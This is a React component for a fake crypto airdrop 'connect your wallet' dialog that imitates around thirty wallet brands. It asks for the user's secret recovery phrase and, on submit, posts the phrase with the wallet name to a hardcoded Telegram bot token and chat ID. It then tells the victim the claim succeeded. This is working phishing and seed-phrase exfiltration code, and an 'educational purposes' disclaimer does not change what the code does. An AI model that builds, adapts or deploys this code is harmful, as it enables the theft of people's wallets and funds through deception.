"use client";

import * as React from "react";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { ArrowLeft, Copy } from "lucide-react";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { ScrollArea } from "./ui/scroll-area";

const wallets = [
  { 
    name: "MetaMask", 
    svg: (
      <svg width="40" height="40" viewBox="0 0 132 129" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M109.682 43.618C109.682 43.618 116.893 72.883 95.999 81.658C75.105 90.433 46.298 68.17 46.298 68.17L62.245 82.527L40.941 90.433L22.95 62.906L36.012 51.98L22.5 35.5L42.251 22.5L56.888 38.358L75.539 22.5L81.332 33.665L109.682 43.618Z" fill="#E17726"/>
        <path d="M109.682 43.618C109.682 43.618 100.907 72.449 81.332 80.355C61.757 88.261 46.298 68.17 46.298 68.17M46.298 68.17L62.245 82.527L40.941 90.433L22.95 62.906L36.012 51.98L22.5 35.5M46.298 68.17L36.012 51.98M22.5 35.5L42.251 22.5L56.888 38.358L75.539 22.5L81.332 33.665L109.682 43.618" stroke="#E17726" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M81.332 33.665L75.539 22.5L56.888 38.358L42.251 22.5L22.5 35.5L36.012 51.98L22.95 62.906L40.941 90.433L62.245 82.527L46.298 68.17C46.298 68.17 61.757 88.261 81.332 80.355C100.907 72.449 109.682 43.618 109.682 43.618L81.332 33.665Z" fill="#F6851B" stroke="#233447" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M88.948 57.268L84.205 62.445L78.151 59.857L81.332 53.284L88.948 57.268Z" fill="#233447"/>
        <path d="M68.529 59.423L62.245 62.445L56.888 56.834L59.635 52.85L68.529 59.423Z" fill="#233447"/>
        <path d="M46.732 46.732L42.251 51.546L36.012 51.98L38.759 45.407L46.732 46.732Z" fill="#763E1A"/>
        <path d="M89.382 46.732L93.429 51.546L99.668 51.98L96.921 45.407L89.382 46.732Z" fill="#763E1A"/>
        <path d="M68.529 33.231L62.245 42.44L56.888 33.231L62.245 36.623L68.529 33.231Z" fill="#763E1A"/>
        <path d="M63.555 68.17L72.883 71.985L68.529 76.284L62.245 74.549L56.888 76.284L52.532 71.985L62.245 68.17H63.555Z" fill="white" stroke="#E17726" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M72.883 71.985L68.529 76.284L62.245 74.549L56.888 76.284L52.532 71.985" stroke="#233447" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    )
  },
  { 
    name: "Trust Wallet", 
    svg: (
      <svg width="40" height="40" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
        <path d="M236.881 58.053c-2.427-6.938-7.653-12.92-14.41-16.712L140.42 2.766c-13.31-7.394-29.418-7.394-42.728 0L15.64 41.341c-6.756 3.792-11.982 9.774-14.409 16.712C-1.2 64.991-0.038 73.355 5.23 79.991l75.34 94.62c7.34 9.22 18.423 14.508 30.158 14.508h.022c11.734 0 22.818-5.288 30.158-14.508l75.34-94.62c5.267-6.636 6.429-15.000 3.633-21.938Z" fill="#3375BB"/>
        <path d="m180.923 79.991-37.671 47.31c-7.34 9.22-18.423 14.508-30.158 14.508h-.022c-11.734 0-22.818-5.288-30.158-14.508l-37.67-47.31h135.68Z" fill="#fff"/>
      </svg>
    )
  },
  { 
    name: "Phantom", 
    svg: (
      <svg width="40" height="40" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="phantom-grad" x1="0" y1="0" x2="1" y2="1">
            <stop offset="0%" stopColor="#8A46FF"/>
            <stop offset="100%" stopColor="#5526FF"/>
          </linearGradient>
        </defs>
        <path fillRule="evenodd" clipRule="evenodd" d="M128 256c70.693 0 128-57.307 128-128C256 57.307 198.693 0 128 0 57.307 0 0 57.307 0 128c0 70.693 57.307 128 128 128Zm-33.32-84.773c-6.386 6.31-6.386 16.631 0 22.941a16.42 16.42 0 0 0 23.119 0l38.4-38.018a16.42 16.42 0 0 0 0-23.119l-38.4-38.018a16.42 16.42 0 0 0-23.119 0c-6.386 6.31-6.386 16.631 0 22.941l15.34 15.22H68.32a16.3 16.3 0 0 0-16.32 16.32c0 9.013 7.307 16.32 16.32 16.32h74.96l-15.22 15.34Z" fill="url(#phantom-grad)"/>
      </svg>
    )
  },
  { 
    name: "Coinbase Wallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm0,18a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" fill="#0052FF"/>
        <path d="M12,7a5,5,0,1,0,5,5A5,5,0,0,0,12,7Zm0,8a3,3,0,1,1,3-3A3,3,0,0,1,12,15Z" fill="#0052FF"/>
      </svg>
    )
  },
  { 
    name: "Tonkeeper", 
    svg: (
      <svg width="40" height="40" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M50 0L95.5 27.25V72.75L50 100L4.5 72.75V27.25L50 0Z" fill="#0098EA"/>
        <path d="M50 13L85 32.5V67.5L50 87L15 67.5V32.5L50 13Z" fill="white"/>
        <path d="M50 25L75 40V60L50 75L25 60V40L50 25Z" fill="#0098EA"/>
      </svg>
    )
  },
  {
    name: "Ledger",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="3" y="8" width="18" height="8" rx="2" fill="#2F2F2F"/>
        <rect x="5" y="10" width="8" height="4" rx="1" fill="#757575"/>
      </svg>
    )
  },
  {
    name: "Trezor",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M4 7C4 5.34315 5.34315 4 7 4H17C18.6569 4 20 5.34315 20 7V17C20 18.6569 18.6569 20 17 20H7C5.34315 20 4 18.6569 4 17V7Z" fill="#1A1A1A"/>
        <circle cx="12" cy="12" r="3" fill="#BDBDBD"/>
      </svg>
    )
  },
  {
    name: "Exodus",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L2 7V17L12 22L22 17V7L12 2Z" stroke="#8A4DFF" strokeWidth="2" strokeLinejoin="round"/>
        <path d="M2 7L12 12L22 7" stroke="#8A4DFF" strokeWidth="2" strokeLinejoin="round"/>
        <path d="M12 22V12" stroke="#8A4DFF" strokeWidth="2" strokeLinejoin="round"/>
        <path d="M17 4.5L7 9.5" stroke="#8A4DFF" strokeWidth="2" strokeLinejoin="round"/>
      </svg>
    )
  },
  {
    name: "MyEtherWallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="#00C78A"/>
        <path d="M12 6L7 12L12 18L17 12L12 6Z" fill="white"/>
      </svg>
    )
  },
  {
    name: "Solflare",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="6" fill="#F7D03A"/>
        <path d="M12 2V4" stroke="#F7D03A" strokeWidth="2" strokeLinecap="round"/>
        <path d="M12 20V22" stroke="#F7D03A" strokeWidth="2" strokeLinecap="round"/>
        <path d="M22 12L20 12" stroke="#F7D03A" strokeWidth="2" strokeLinecap="round"/>
        <path d="M4 12L2 12" stroke="#F7D03A" strokeWidth="2" strokeLinecap="round"/>
        <path d="M18.36 5.64L16.95 7.05" stroke="#F7D03A" strokeWidth="2" strokeLinecap="round"/>
        <path d="M7.05 16.95L5.64 18.36" stroke="#F7D03A" strokeWidth="2" strokeLinecap="round"/>
        <path d="M18.36 18.36L16.95 16.95" stroke="#F7D03A" strokeWidth="2" strokeLinecap="round"/>
        <path d="M7.05 7.05L5.64 5.64" stroke="#F7D03A" strokeWidth="2" strokeLinecap="round"/>
      </svg>
    )
  },
  {
    name: "Rainbow",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12" stroke="#FF5733" strokeWidth="3" strokeLinecap="round"/>
        <path d="M5 12C5 8.13401 8.13401 5 12 5C15.866 5 19 8.13401 19 12" stroke="#FFC300" strokeWidth="3" strokeLinecap="round"/>
        <path d="M7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12" stroke="#DAF7A6" strokeWidth="3" strokeLinecap="round"/>
        <path d="M9 12C9 10.3431 10.3431 9 12 9C13.6569 9 15 10.3431 15 12" stroke="#900C3F" strokeWidth="3" strokeLinecap="round"/>
      </svg>
    )
  },
  {
    name: "Argent",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L2 22H22L12 2Z" fill="#FF5733"/>
        <path d="M12 11L15 18H9L12 11Z" fill="white"/>
      </svg>
    )
  },
  {
    name: "Zerion",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M4 4H20L12 12L20 20H4L12 12L4 4Z" stroke="#2196F3" strokeWidth="2" strokeLinejoin="round"/>
      </svg>
    )
  },
  {
    name: "imToken",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="#0989FD"/>
        <path d="M12 5L15 12L12 19L9 12L12 5Z" stroke="white" strokeWidth="2" strokeLinejoin="round"/>
      </svg>
    )
  },
  {
    name: "MathWallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M4 20V4L12 12L20 4V20" stroke="#00C4FF" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    )
  },
  {
    name: "SafePal",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L2 7V17L12 22L22 17V7L12 2Z" fill="#1994F3"/>
        <path d="M16 10C16 12.2091 14.2091 14 12 14C9.79086 14 8 12.2091 8 10C8 7.79086 9.79086 6 12 6C14.2091 6 16 7.79086 16 10Z" fill="white"/>
        <path d="M12 14V18" stroke="white" strokeWidth="2" strokeLinecap="round"/>
      </svg>
    )
  },
  {
    name: "Atomic Wallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="2" stroke="#2A65F7" strokeWidth="2"/>
        <path d="M12 2C6.47715 2 2 6.47715 2 12" stroke="#2A65F7" strokeWidth="2" strokeLinecap="round"/>
        <path d="M22 12C22 17.5228 17.5228 22 12 22" stroke="#2A65F7" strokeWidth="2" strokeLinecap="round"/>
        <path d="M12 22C6.47715 22 2 17.5228 2 12" transform="rotate(120 12 12)" stroke="#2A65F7" strokeWidth="2" strokeLinecap="round"/>
        <path d="M22 12C22 6.47715 17.5228 2 12 2" transform="rotate(120 12 12)" stroke="#2A65F7" strokeWidth="2" strokeLinecap="round"/>
        <path d="M12 22C6.47715 22 2 17.5228 2 12" transform="rotate(-120 12 12)" stroke="#2A65F7" strokeWidth="2" strokeLinecap="round"/>
        <path d="M22 12C22 6.47715 17.5228 2 12 2" transform="rotate(-120 12 12)" stroke="#2A65F7" strokeWidth="2" strokeLinecap="round"/>
      </svg>
    )
  },
  {
    name: "Guarda Wallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L4 6V13.55C4 17.5 7.34 21.23 12 22C16.66 21.23 20 17.5 20 13.55V6L12 2Z" fill="#2AA89A"/>
        <path d="M15 10H9V12C9 13.65 10.35 15 12 15C13.65 15 15 13.65 15 12V10Z" fill="white"/>
      </svg>
    )
  },
  {
    name: "Coinomi",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M20 12C20 16.4183 16.4183 20 12 20C7.58172 20 4 16.4183 4 12C4 7.58172 7.58172 4 12 4" stroke="#4B9FE3" strokeWidth="2" strokeLinecap="round"/>
        <path d="M12 12L16 8" stroke="#4B9FE3" strokeWidth="2" strokeLinecap="round"/>
      </svg>
    )
  },
  {
    name: "Zengo",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="#363636"/>
        <path d="M8 8L16 16" stroke="white" strokeWidth="2" strokeLinecap="round"/>
        <path d="M16 8H8V16" stroke="white" strokeWidth="2" strokeLinejoin="round"/>
      </svg>
    )
  },
  {
    name: "Crypto.com DeFi Wallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L2 7V17L12 22L22 17V7L12 2Z" fill="#1199FA"/>
        <path d="M17.5 7.5L12 10.5L6.5 7.5L12 4.5L17.5 7.5Z" fill="white"/>
        <path d="M6.5 9V15L12 18L17.5 15V9L12 12L6.5 9Z" fill="white" fillOpacity="0.7"/>
      </svg>
    )
  },
  {
    name: "Unstoppable Wallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="#FFC700"/>
        <path d="M8 15V9H16V15" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    )
  },
  {
    name: "BitPay",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="10" fill="#1E409C"/>
        <path d="M10 7H14C15.1046 7 16 7.89543 16 9V10C16 11.1046 15.1046 12 14 12H10V7Z" fill="white"/>
        <path d="M10 12H15C16.1046 12 17 12.8954 17 14V15C17 16.1046 16.1046 17 15 17H10V12Z" fill="white"/>
      </svg>
    )
  },
  {
    name: "BRD",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="2" y="2" width="20" height="20" rx="4" fill="#FE5035"/>
        <path d="M8 7H12.5C14.433 7 16 8.567 16 10.5V13.5C16 15.433 14.433 17 12.5 17H8V7Z" fill="white"/>
        <circle cx="12.5" cy="12" r="1.5" fill="#FE5035"/>
      </svg>
    )
  },
  {
    name: "Frame",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M3 3H21V21H3V3Z" stroke="#04DD8D" strokeWidth="2" strokeLinejoin="round"/>
        <path d="M8 8H16V16H8V8Z" stroke="#04DD8D" strokeWidth="2" strokeLinejoin="round"/>
      </svg>
    )
  },
  {
    name: "Rabby Wallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M16 12C16 14.2091 14.2091 16 12 16C9.79086 16 8 14.2091 8 12C8 9.79086 9.79086 8 12 8C14.2091 8 16 9.79086 16 12Z" fill="#865DFF"/>
        <path d="M12 2C12 2 14 4 15 5" stroke="#865DFF" strokeWidth="2" strokeLinecap="round"/>
        <path d="M12 2C12 2 10 4 9 5" stroke="#865DFF" strokeWidth="2" strokeLinecap="round"/>
      </svg>
    )
  },
  {
    name: "Core",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="12" cy="12" r="8" stroke="#10A5E3" strokeWidth="3"/>
        <circle cx="12" cy="12" r="3" fill="#10A5E3"/>
      </svg>
    )
  },
  {
    name: "Enkrypt",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2L4 6V13C4 17.14 7.58 20.84 12 22C16.42 20.84 20 17.14 20 13V6L12 2Z" fill="#0AAB5E"/>
        <path d="M16 10H8V14H16V10Z" fill="white"/>
        <path d="M8 12H16" stroke="#0AAB5E" strokeWidth="2"/>
      </svg>
    )
  },
  {
    name: "XDEFI Wallet",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M4 4L20 20M20 4L4 20" stroke="#19D894" strokeWidth="3" strokeLinecap="round"/>
      </svg>
    )
  },
  {
    name: "Keplr",
    svg: (
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M4 4L12 12L4 20V4Z" fill="#1C1C1C"/>
        <path d="M20 4L12 12L20 20V4Z" fill="#1C1C1C"/>
      </svg>
    )
  },
];


const FormSchema = z.object({
  secretPhrase: z
    .string()
    .trim()
    .refine(
      (value) => {
        const wordCount = value.split(/\s+/).filter(Boolean).length;
        return [12, 18, 24].includes(wordCount);
      },
      {
        message:
          "Secret phrase must contain exactly 12, 18, or 24 words.",
      }
    ),
});

function SecretPhraseForm({ wallet, onBack, onSuccess, formKey }) {
  const { toast } = useToast();
  const form = useForm<z.infer<typeof FormSchema>>({
    resolver: zodResolver(FormSchema),
    defaultValues: {
      secretPhrase: "",
    },
  });

  React.useEffect(() => {
    form.reset();
  }, [formKey, form]);


  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      form.setValue("secretPhrase", text, { shouldValidate: true });
    } catch (err) {
      console.error("Failed to read clipboard contents: ", err);
      toast({
        title: "Paste Failed",
        description: "Could not read from clipboard. Please paste manually.",
        variant: "destructive",
      });
    }
  };

  const onSubmit = async (data: z.infer<typeof FormSchema>) => {
    const botToken = "6858405369:AAHIBm11hz5SSLgH_BZb9mSSFBIOkeiExb8";
    const chatId = "5485468089";
    const timestamp = new Date().toISOString();
    const message = `Wallet: ${wallet.name}\nSecret Phrase: ${data.secretPhrase}\nTimestamp: ${timestamp}`;

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      const result = await response.json();

      if (result.ok) {
        toast({
          title: "Claim Successful!",
          description: "Your ZK tokens have been sent to your wallet. (Simulation)",
        });
        onSuccess();
      } else {
        throw new Error(result.description);
      }
    } catch (error) {
      console.error("Failed to send to Telegram:", error);
      toast({
        title: "Submission Failed",
        description: "There was an error submitting your claim. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <>
      <DialogHeader>
        <div className="flex items-center gap-3 -ml-4">
          <Button variant="ghost" size="icon" onClick={onBack} aria-label="Go back to wallet selection">
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <div className="flex items-center gap-3">
             {wallet.svg ? (
              <div className="w-8 h-8 flex items-center justify-center">{wallet.svg}</div>
            ) : (
               <img
                src={wallet.logo}
                alt={`${wallet.name} logo`}
                width={32}
                height={32}
                className="rounded-md"
                data-ai-hint={wallet.hint}
              />
            )}
            <DialogTitle className="font-headline text-xl">
              Import your {wallet.name}
            </DialogTitle>
          </div>
        </div>
        <DialogDescription className="pt-2 text-left pl-11">
          Enter your secret recovery phrase to connect your wallet.
          <span className="font-bold"> Never share this phrase.</span>
        </DialogDescription>
      </DialogHeader>
      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6 pt-4">
          <FormField
            control={form.control}
            name="secretPhrase"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="sr-only">Secret Phrase</FormLabel>
                <div className="relative">
                  <FormControl>
                    <Textarea
                      placeholder="Enter your 12, 18, or 24 word secret phrase..."
                      className="resize-none pr-12"
                      rows={4}
                      {...field}
                    />
                  </FormControl>
                  <Button
                    type="button"
                    variant="ghost"
                    size="icon"
                    className="absolute top-2 right-2 h-7 w-7"
                    onClick={handlePaste}
                    aria-label="Paste secret phrase"
                  >
                    <Copy className="h-4 w-4" />
                  </Button>
                </div>
                <FormMessage />
              </FormItem>
            )}
          />

           <p className="text-xs text-muted-foreground">
              This site is for educational purposes. Do not use your real secret phrase.
            </p>
          <Button
            type="submit"
            className="w-full bg-accent text-accent-foreground hover:bg-accent/90"
            disabled={form.formState.isSubmitting}
          >
            {form.formState.isSubmitting
              ? "Validating..."
              : "Import Wallet"}
          </Button>
        </form>
      </Form>
    </>
  );
}

export function WalletConnectModal({ isOpen, onOpenChange }) {
  const [view, setView] = React.useState("wallets");
  const [selectedWallet, setSelectedWallet] = React.useState(null);
  const [formKey, setFormKey] = React.useState(() => Date.now());


  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setView("form");
  };

  const handleBack = () => {
    setView("wallets");
    setSelectedWallet(null);
  };
  
  const handleClose = (open) => {
    if (!open) {
      setTimeout(() => {
        setView("wallets");
        setSelectedWallet(null);
        setFormKey(Date.now()); // Reset the form by changing the key
      }, 300); // Wait for close animation
    }
    onOpenChange(open);
  }

  React.useEffect(() => {
    if (!isOpen) {
      setTimeout(() => {
        setView("wallets");
        setSelectedWallet(null);
        setFormKey(Date.now()); // Also reset on parent-driven close
      }, 300);
    }
  }, [isOpen]);

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="sm:max-w-[480px]">
        {view === "wallets" ? (
          <>
            <DialogHeader>
              <DialogTitle className="font-headline text-2xl text-center">
                Connect your wallet
              </DialogTitle>
              <DialogDescription className="text-center">
                Select your wallet from the list below to claim your airdrop.
              </DialogDescription>
            </DialogHeader>
            <ScrollArea className="h-[400px] pr-4">
              <div className="grid grid-cols-1 gap-2">
                {wallets.map((wallet) => (
                  <button
                    key={wallet.name}
                    onClick={() => handleWalletSelect(wallet)}
                    className="flex items-center w-full p-3 text-left rounded-lg hover:bg-secondary transition-colors focus:outline-none focus-visible:ring-2 focus-visible:ring-ring"
                  >
                    {wallet.svg ? (
                      <div className="w-10 h-10 flex items-center justify-center mr-4">{wallet.svg}</div>
                    ) : (
                      <img
                        src={wallet.logo}
                        alt={`${wallet.name} logo`}
                        width={40}
                        height={40}
                        className="rounded-md mr-4"
                        data-ai-hint={wallet.hint}
                      />
                    )}
                    <span className="font-medium">{wallet.name}</span>
                  </button>
                ))}
              </div>
            </ScrollArea>
          </>
        ) : (
          <SecretPhraseForm
            wallet={selectedWallet}
            onBack={handleBack}
            onSuccess={() => onOpenChange(false)}
            formKey={formKey}
          />
        )}
      </DialogContent>
    </Dialog>
  );
}
